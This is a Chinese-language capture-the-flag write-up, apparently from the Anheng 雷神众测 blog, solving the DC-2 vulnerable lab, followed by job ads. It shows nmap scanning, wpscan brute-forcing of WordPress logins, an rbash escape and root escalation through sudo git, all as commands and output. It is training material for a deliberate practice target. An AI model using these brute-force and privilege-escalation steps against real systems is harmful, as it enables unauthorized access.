> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6WII27HvRmMSXTpXAdRmcg)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**_**No.1  
**_**_

_**描述**_

与 DC-1 一样，DC-2 是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。与原始 DC-1 一样，它在设计时就考虑了初学者。必须具备 Linux 技能并熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。与 DC-1 一样，共有五个标志，包括最终标志。

_**_**No.2  
**_**_

_**搭建测试靶机**_

上篇文章有详细搭建过程，在此就不再演示。  
下载地址：https://www.five86.com/dc-2.html  
则靶机 DC-2 ip：192.168.188.157  
攻击机 kalilinux ip：192.168.188.144  
Flag：5 个  
在测试之前需要修改一下 host 文件的配置，添加渗透靶机的 IP 地址和域名（访问渗透靶机时 80 端口时，他会自动跳转成 dc-2 不修改会无法访问。）

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciaf4kicpN5n0UGs41eoXORDVUxiaZ0NqwNBNvzc63pSSVdr0fGYghVdBiaiaA/640?wx_fmt=png)

host 文件位置  
kail 环境：/etc/host.conf  
windows 环境：C:\Windows\System32\drivers\etc

_**_**No.3  
**_**_

_**漏洞利用**_

**获取 flag1**  

先来端口扫描  
利用 nmap 对目标主机进行端口扫描，发现开放端口：80 和 7744  
使用命令：nmap -sV -p- 192.168.188.157  
-sV 用来扫描目标主机和端口上运行的软件的版本  
-p 80 指定 80 端口  
-p- 扫描 0-65535 全部端口

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafEibQObGXNFwR18nqD3tP3X4bfm3GbtZWqMKkAjUKB350uUyDj66Vo7w/640?wx_fmt=png)

```
root@kalilinux:~# nmap -sV -p- 192.168.188.157
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 16:41 CST
Nmap scan report for 192.168.188.157
Host is up (0.00078s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
MAC Address: 00:0C:29:90:FF:30 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.17 seconds
```

发现开放 80 端口，则可以进行网页访问。  
访问网页，是一个 wordpress 模板的博客网站，页面可以直接获得 flag1  
提示使用 cewl 密码字典生成工具，并且在登录后可以找到下一个 flag

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciaf6IubMfErRiaV34t0tlnu8hqosicSq7PTreYPRibzlAkbJBPpibibVmSJtGg/640?wx_fmt=png)

**获取 flag2**

根据 flag1 的提示，使用 cewl 生成密码保存在当前目录的 pwd.txt 中:

```
root@kalilinux:/# cewl http://dc-2/ -w pwd.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafpYRIDPwTXMlPDUBtlYFdr78L4ydweMg9cafn7UvFo4xFxj2PeFV4Qg/640?wx_fmt=png)

密码有了, 于是还得获取用户名。  
之前已经知道服务器上搭建的是一个 wordpress 网站，所以可以想到 wpscan 扫描来枚举网站中的可用用户。  
获取用户名 (wpscan)  
使用 wpscan 枚举该网站的可用用户:

```
root@kalilinux:/# wpscan --url dc-2 -e u
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafjmNj01WWbicYI09CuNRXC2z2MnPb0CtXvLWerQw4rn0qmOBogiaTrqSQ/640?wx_fmt=png)

查看一下扫描的结果，扫描后可以找到三个用户名：admin、tom、jerry

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciaf3UBQYdEsByqcF05mSOpYFHZDV6JiawWKTYJmKVDrks9fQickpjqiciciaUA/640?wx_fmt=png)

```
root@kalilinux:/# wpscan --url dc-2 -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://dc-2/
[+] Started: Thu Nov 12 18:16:07 2020

Interesting Finding(s):

[+] http://dc-2/
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.

[+] Finished: Thu Nov 12 18:16:10 2020
[+] Requests Done: 55
[+] Cached Requests: 6
[+] Data Sent: 12.342 KB
[+] Data Received: 514.096 KB
[+] Memory used: 134.669 MB
[+] Elapsed time: 00:00:03
```

新建一个. list 文件（例如：dc-2users.list）将扫描到的三个用户名添加到该文件中。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciaf2hk3KdmziawovN8FPAGKs2No1BJuac6MuicujAQ5ueRWCksQnmmqPhZQ/640?wx_fmt=png)

```
vim dc-2users.list

admin
tom
jerry
```

结合 cewl 工具生成的字典文件进行爆破

```
root@kalilinux:/# wpscan --url http://dc-2/ -U dc-2users.list -P pwd.txt
```

```
root@kalilinux:/# wpscan --url http://dc-2/ -U dc-2users.list -P pwd.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://dc-2/
[+] Started: Fri Nov 13 11:08:01 2020

Interesting Finding(s):

[+] http://dc-2/
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <====================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing                                                                                                   
[SUCCESS] - tom / parturient                                                                                                     
Trying admin / the Time: 00:00:50 <==========================================================> (645 / 645) 100.00% Time: 00:00:50
Trying admin / log Time: 00:00:50 <==========================================================> (645 / 645) 100.00% Time: 00:00:50

[i] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.

[+] Finished: Fri Nov 13 11:08:56 2020
[+] Requests Done: 699
[+] Cached Requests: 5
[+] Data Sent: 318.158 KB
[+] Data Received: 682.345 KB
[+] Memory used: 216.595 MB
[+] Elapsed time: 00:00:54
root@kalilinux:/# 

 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

后台登陆 jerry 发现 flag2

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafeSHcfYQJgLjOdmlCZiaJzV4nNrap6UZzA0aarFPJcwtPFYRXTr6l8RA/640?wx_fmt=png)

**获取 Flag3**

结合扫描出来的服务，尝试 SSH 登录

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafzWh8HmO9OuczW6sBN90V18GyTQ4FerS5CnundiaYibrkkF9nQugJC2Tw/640?wx_fmt=png)

尝试为 tom 可以登录  
发现为受限 shell（限制了可执行的命令）  
绕过受限 shell  
BASH_CMDS[a]=/bin/sh;a  
然后 /bin/bash

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciaf3Gt0aNXiawliaWC5zFpLCVr9VZiakIEVeslrHlMHTyamL9PE8NlFxfTWg/640?wx_fmt=png)

使用并添加环境变量  
export PATH=$PATH:/bin/  
可以查看 flag3.txt 的内容：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafsD14dPwaMXY1U8vu1ibwSxvWu5njK7KKQwSQYVTiaGJvBaibT5icCwlaRA/640?wx_fmt=png)

PATH 就是定义 / bin:/sbin:/usr/bin 等这些路径的变量，其中冒号为目录间的分割符。

```
tom@DC-2:~$ export -p
declare -x HOME="/home/tom"
declare -x LANG="en_US.UTF-8"
declare -x LOG
declare -x MAIL="/var/mail/tom"
declare -x OLDPWD
declare -x PATH="/home/tom/usr/bin:/bin/"
declare -x PWD="/home/tom"
declare -x SHELL="/bin/rbash"
declare -x SHLVL="2"
declare -x SSH_CLIENT="192.168.188.144 51118 7744"
declare -x SSH_CONNECTION="192.168.188.144 51118 192.168.188.157 7744"
declare -x SSH_TTY="/dev/pts/1"
declare -x TERM="xterm-256color"
declare -x USER="tom"
tom@DC-2:~$
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafWInibx5pYcDI13LmzaoIpOEPZxiaZ9LXhlzBtAbgMjhBJV1rvvR38I9w/640?wx_fmt=png)

**获取 flag4**

切换到 Jerry 用户

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafm6tmZBOugaLIo4X9YcEIFtFb8TdXhDGguZQdGumGuDhcibtgKsOtygQ/640?wx_fmt=png)

切换到 jerry，去查看 Jerry 目录下的文件，发现有个 flag4.txt 文件，并用过 cat 命令查看；

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciaficGUicrJsGPvx5iaBZwErWkyicgAC2ecNN3YZTnDCp2GTEd6BFVdRuEx2w/640?wx_fmt=png)

**获取 flag5**

根据 flag4 提示还不是最终的 flag，提示 git，查看 sudo 配置文件，发现 git 是 root 不用密码可以运行，搜索 git 提权

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafXD7mH6xrtCXlWZ9cyTaHcjQkBPEV9YjDNhibibzyCibI6MBQeznpmT2KQ/640?wx_fmt=png)

进行提权，提权成功；  
使用 sudo git -p help 且一页不能显示完，  
在最底下面输入 !/bin/bash，  
最后完成提权。

```
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
jerry@DC-2:~$ sudo git -p help
usage: git [--version] [--help] [-C <path>] [-c name=value]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p|--paginate|--no-pager] [--no-replace-objects] [--bare]
           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
           <command> [<args>]

The most commonly used git commands are:
   add        Add file contents to the index
   bisect     Find by binary search the change that introduced a bug
   branch     List, create, or delete branches
   checkout   Checkout a branch or paths to the working tree
   clone      Clone a repository into a new directory
   commit     Record changes to the repository
   diff       Show changes between commits, commit and working tree, etc
   fetch      Download objects and refs from another repository
   grep       Print lines matching a pattern
   init       Create an empty Git repository or reinitialize an existing one
   log        Show commit logs
   merge      Join two or more development histories together
   mv         Move or rename a file, a directory, or a symlink
   pull       Fetch from and integrate with another repository or a local branch
   push       Update remote refs along with associated objects
   rebase     Forward-port local commits to the updated upstream head
   reset      Reset current HEAD to the specified state
   rm         Remove files from the working tree and from the index
   show       Show various types of objects
   status     Show the working tree status
   tag        Create, list, delete or verify a tag object signed with GPG

'git help -a' and 'git help -g' lists available subcommands and some
!/bin/bash
root@DC-2:/home/jerry# whoami
root
root@DC-2:/home/jerry#
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciaf4wbvjB4ialdgbXuv0hgqTvlBv4p112g4joS1o9X1nnlLX6IZiacWNpyg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNJUk7b6deYToSVKRcmciafJ1GFib9rricAVP0KMPA7sfX3ibpNFeanJicuUL7w9S4M8k0B9YOgxyA63w/640?wx_fmt=png)

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

岗位：红队武器化 Golang 开发工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至 

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWNJUk7b6deYToSVKRcmciafCFlkNQhJpsgVIvhFDhdhUicoqp55icAQELzUlqCiaMibc00wgxJg6SGMcQ/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWNJUk7b6deYToSVKRcmciaf9MqsrGSZyulpsgdh2tUhwy3JM8qRV0ypwAaN8MibId78oTXvyuV0F9Q/640?wx_fmt=jpeg)